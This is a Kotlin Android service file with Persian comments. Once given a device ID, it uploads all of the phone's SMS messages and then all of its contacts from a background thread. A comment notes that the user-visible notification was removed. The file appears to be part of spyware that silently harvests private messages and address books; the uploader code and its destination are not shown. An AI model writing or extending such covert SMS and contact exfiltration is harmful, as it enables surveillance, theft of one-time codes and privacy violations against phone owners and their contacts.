package com.example.test

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.example.test.utils.DataUploader

class DataUploadService : Service() {

    companion object {
        private const val TAG = "DataUploadService"
        const val EXTRA_DEVICE_ID = "device_id"
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🚀 DataUploadService CREATED")
        Log.d(TAG, "════════════════════════════════════════")
        // ⭐ Notification حذف شد - فقط برای آپلود موقت است
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = intent?.getStringExtra(EXTRA_DEVICE_ID)

        if (deviceId.isNullOrEmpty()) {
            Log.e(TAG, "❌ Device ID is null or empty!")
            stopSelf()
            return START_NOT_STICKY
        }

        Log.d(TAG, "📱 Device ID: $deviceId")
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🔄 STARTING BACKGROUND UPLOAD")
        Log.d(TAG, "════════════════════════════════════════")

        // اجرای آپلود در Thread جداگانه
        Thread {
            var smsSuccess = false
            var contactsSuccess = false

            try {
                // 4️⃣ آپلود SMS‌ها
                Log.d(TAG, "4️⃣ Starting SMS upload in background...")

                DataUploader.uploadAllSms(this, deviceId)
                smsSuccess = true

                Log.d(TAG, "✅ SMS upload completed successfully")
                Log.d(TAG, "════════════════════════════════════════")

                // فاصله کوتاه بین عملیات‌ها
                Thread.sleep(1000)

                // 5️⃣ آپلود مخاطبین
                Log.d(TAG, "5️⃣ Starting contacts upload in background...")

                DataUploader.uploadAllContacts(this, deviceId)
                contactsSuccess = true

                Log.d(TAG, "✅ Contacts upload completed successfully")
                Log.d(TAG, "════════════════════════════════════════")

                // نمایش نتیجه نهایی
                if (smsSuccess && contactsSuccess) {
                    Log.d(TAG, "🎉 ALL BACKGROUND UPLOADS COMPLETED")
                } else {
                    Log.w(TAG, "⚠️ SOME UPLOADS FAILED")
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Upload error: ${e.message}", e)
                e.printStackTrace()
            } finally {
                Log.d(TAG, "════════════════════════════════════════")
                Log.d(TAG, "🛑 DataUploadService STOPPING")
                Log.d(TAG, "════════════════════════════════════════")
                stopSelf()
            }
        }.start()

        return START_STICKY
    }


    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "👋 DataUploadService destroyed")
    }
}